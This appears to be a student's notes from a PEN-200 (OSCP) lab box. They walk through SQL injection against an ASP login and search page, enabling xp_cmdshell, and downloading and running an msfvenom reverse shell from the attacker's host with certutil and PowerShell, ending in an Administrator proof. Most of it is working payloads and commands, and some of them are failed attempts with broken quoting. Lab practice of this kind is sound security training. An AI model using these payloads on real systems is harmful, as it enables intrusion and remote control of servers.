#summary

```shell
step 1: dirbust identify login.asp
step 2: use ' or 1=1-- to break into search.asp
step 3: in search.asp try the ' or 1=1-- and get a list of artist and song names
step 4: use ' union all select @@version, 2-- to find that the 1st field is the injectable field
step 5: ' UNION SELECT 1, NULL; EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure'xp_cmdshell',1;RECONFIGURE-- use this command to essentially enable xp_cmdshell to be used in the sql queries - reconfigure is used to iron in the settings.
step 6: ' UNION SELECT 1, null;EXEC master..xp_cmdshell 'powershell.exe -c ping 192.168.119.157';-- setup ping command and use wireshark to see if we are now able to RCE
step 7: make a reverse shell and setup http server on port 80
step 8: used command below to transfer file onto victim and place in c:\windows\tasks
	#### going to " both seperate paths  
	#### worked!  - the brackets were " " in the http
' UNION SELECT 1,NULL;EXEC master..xp_cmdshell 'certutil.exe -urlcache -split -f "[http://192.168.119.157/rev.exe] (http://192.168.119.157/rev.exe)" "C:\Windows\Tasks\rev.exe"';--

step 9: setup listener and execute the command ' UNION SELECT 1,NULL;EXEC master..xp_cmdshell 'cmd.exe /c C:\windows\tasks\rev.exe';--

step 10: catch rev shell and pull proof.

```

#ftp
```shell
#anonymous login allowed, downloaded the foxitreader.exe

sql references
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
https://bhanusnotes.blogspot.com/2019/09/sql-injection-cheat-sheet.html
https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html
https://portswigger.net/web-security/sql-injection/union-attacks
https://www.sqlservercentral.com/blogs/how-to-check-advanced-options-in-sql-server
https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html
https://www.tarlogic.com/blog/red-team-tales-0x01/#0x01_-_Stacked_queries
https://www.exploit-db.com/papers/12975 - sql pwnage
https://akimbocore.com/article/finding-sql-injection/
https://www.sqlservercentral.com/blogs/how-to-check-advanced-options-in-sql-server
https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e

```

#webserver
```shell
#checking out the webservers

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.128]
└─# gobuster dir -u http://10.11.1.128:4167 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.1.128:4167
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 17:09:50 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 161] [--> http://10.11.1.128:4167/aspnet_client/]
/login.asp            (Status: 200) [Size: 393]
/Login.asp            (Status: 200) [Size: 393]
/search.asp           (Status: 302) [Size: 130] [--> login.asp]
/Search.asp           (Status: 302) [Size: 130] [--> login.asp]
Progress: 27672 / 27690 (99.93%)
===============================================================
2023/03/23 17:13:17 Finished
===============================================================
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.128]
└─# 



dirsearch -e php,html,js,asp,aspx -u http://10.11.1.128:4167 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```


```shell
union all select 1
union all select 1,2


union select 1, 2, 3, 4, 5, 6, 7, 8
union all select 1, 2, 3, 4, 5, 6, 7
union all select 1, 2, 3, 4, 5, 6,
union all select 1, 2, 3, 4, 5
union all select 1, 2, 3, 4
union all select 1, 2, 3
union all select 1, 2
union all select 1


http://10.11.1.128:4167/loginform.asp?uname=%27or+1%3D1&psw=hello
```

```shell
# able to get in using sql injection below in both use and password fields
' or 1=1 --
```

![[1. sql fields p1.png]]

![[2. sql p2.png]]

![[3. sql p3.png]]

```shell
# 1st going to mess with sql injection on the search.asp page, might be able to get a rev shell

cheatsheets

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
#unsure what to do next, going to dirbust the vnc-http

# USE A ' TO DELINIATE BEGINNING OF AN SQL QUERY
#IMAGE BELOW IS WHAT 
' union all select @@version, 2--
' union all select 1, 2, 3--



#https://portswigger.net/web-security/sql-injection/union-attacks
	reference used
#TESTED THIS to see if it shows when it breaks and it does
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--
```

![[4. sql working.png]]

```shell
# working sql injection for strings
' UNION SELECT 'TEST',NULL--
```

![[5. sql test null select a.png]]


```shell
# testing where else strings can be input

' UNION SELECT 'a',NULL,NULL,NULL-- # failed
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

```shell
#references


```


```SHELL
#reference
https://bhanusnotes.blogspot.com/2019/09/sql-injection-cheat-sheet.html
# GOT USERNAME dbo from this
'UNION ALL SELECT USER_NAME(), 2--
```

![[6. dbo user.png]]

```shell
#same refersence as above
'UNION ALL SELECT @@SERVERNAME, 2--
```

![[7. sql server name.png]]


```shell
# did not work
'UNION ALL SELECT exec sp_configure 'show advanced options', 2--

EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
```

```shell
#random note from someone 
# https://www.sqlservercentral.com/blogs/how-to-check-advanced-options-in-sql-server reference article for explanation

# the way that I am thinking this through:
so due to select 1 being ablt to be injected we union select 1, null; to initiate working in that column or table and then execute the commands setting them with the 1 parameters which correlates to specific settings that have to be looked up. 

#configuring xp_cmdshell
' UNION SELECT 1, NULL; EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure'xp_cmdshell',1;RECONFIGURE--

# attempting ping
' UNION SELECT 1, null;EXEC master..xp_cmdshell 'powershell.exe -c ping 192.168.119.157';--

# the ping worked as shown below, the 10.11.1.128 is pinging our box, should be ablke to RCE now.
```


![[8. sql ping.png]]

```shell
# now i know that ping workds, going to try to use powershell one liner to download my reverse shell and execute it.

#powershell file transfer - stuck not working
' UNION SELECT 1, null;EXEC master..xp_cmdshell 'powershell.exe (New-Object
System.Net.WebClient).DownloadFile('http://192.168.119.157/rev.exe', 'C:\Windows\Tasks\rev.exe')';--

#cert util
' UNION SELECT 1, null;EXEC master..xp_cmdshell 'certutil -urlcache -f http://192.168.45.208/rev2.exe', 'C:\Windows\Tasks\rev.exe')';--

```

```shell
# making reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.157 LPORT=7777 -f exe -o rev.exe
```



```shell
# sql stuff tried

#configuring xp_cmdshell  
' UNION SELECT 1, NULL; EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure'xp_cmdshell',1;RECONFIGURE--  
  
#testing ping  - ensured ping worked by opening up wireshark and seeing if the 10.11.1.128 was reach out to my machine
' UNION SELECT 1,NULL;EXEC master..xp_cmdshell 'powershell.exe -c ping 192.168.119.157';--  

#python3 -m http.server 80 setup prior to attempting file transfers
  
# worked to transfer, now need to find where the file was placed  
' UNION SELECT 1,NULL;EXEC master..xp_cmdshell 'certutil.exe -urlcache -split -f "[http://192.168.119.157/rev.exe](http://192.168.119.157/rev.exe)"';--  
  
# took away the end " from the above transfer to see if it worked, becuase I was getting some 404 errors in my http python server 
' UNION SELECT 1,NULL;EXEC master..xp_cmdshell 'certutil.exe -urlcache -split -f "[http://192.168.119.157/rev.exe](http://192.168.119.157/rev.exe) C:\Windows\Tasks\rev.exe';--  
  
#### going to " both seperate paths  
#### worked!  - the brackets were " " in the http
' UNION SELECT 1,NULL;EXEC master..xp_cmdshell 'certutil.exe -urlcache -split -f "[http://192.168.119.157/rev.exe] (http://192.168.119.157/rev.exe)" "C:\Windows\Tasks\rev.exe"';--  
  
' UNION SELECT 1,NULL;EXEC master..xp_cmdshell 'C:\windows\tasks\rev.exe';--  
  
#### fucking worked!!!  
' UNION SELECT 1,NULL;EXEC master..xp_cmdshell 'cmd.exe /c C:\windows\tasks\rev.exe';--  
  
' UNION SELECT 1,NULL;EXEC master..xp_cmdshell '/c C:\windows\tasks\rev.exe"';--  
  
' UNION SELECT 1,NULL;EXEC xp_cmdshell 'cmd.exe /c C:\windows\tasks\rev.exe';--  
  
  
  
#reverse shell  
' UNION SELECT 1, NULL;EXEC master..xp_cmdshell 'powershell.exe (New-Object System.Net.WebClient).DownloadFile('[http://192.168.119.157/rev.exe](http://192.168.119.157/rev.exe)', 'C:\Windows\Tasks\rev.exe')';--  
  
' UNION SELECT 1, NULL;EXEC master..xp_cmdshell 'powershell.exe -c (New-Object System.Net.WebClient).DownloadFile('[http://192.168.119.157/rev.exe](http://192.168.119.157/rev.exe)', 'C:\Windows\Tasks\rev.exe')';--  
  
' UNION SELECT 1, NULL;EXEC master..xp_cmdshell 'powershell.exe (New-Object System.Net.WebClient).DownloadFile('[http://192.168.119.157/rev.exe](http://192.168.119.157/rev.exe)', 'C:\Windows\Tasks\rev.exe');--  
  
' UNION SELECT 1, NULL;EXEC master..xp_cmdshell 'powershell.exe (New-Object System.Net.WebClient).DownloadFile('[http://192.168.119.157/rev.exe](http://192.168.119.157/rev.exe)', 'C:\Windows\Tasks\rev.exe')";--  
  
  
#reverse shell certutil  
' UNION SELECT 1, NULL;EXEC master..xp_cmdshell 'certutil -urlcache -f [http://192.168.119.157/rev.exe](http://192.168.119.157/rev.exe)', 'C:\Windows\Tasks\rev.exe')';--  
  
#wget  
' UNION SELECT 1, NULL;EXEC master..xp_cmdshell 'certutil -urlcache -f [http://192.168.119.157/rev.exe](http://192.168.119.157/rev.exe)', 'C:\Windows\Tasks\rev.exe')';-
```
![[9. ipconfig & proof.txt.png]]


```shell
C:\Users\Administrator\Desktop>type proof.txt  
type proof.txt  
3ea3bb71d63b5804fc65287cb26e9cc8
```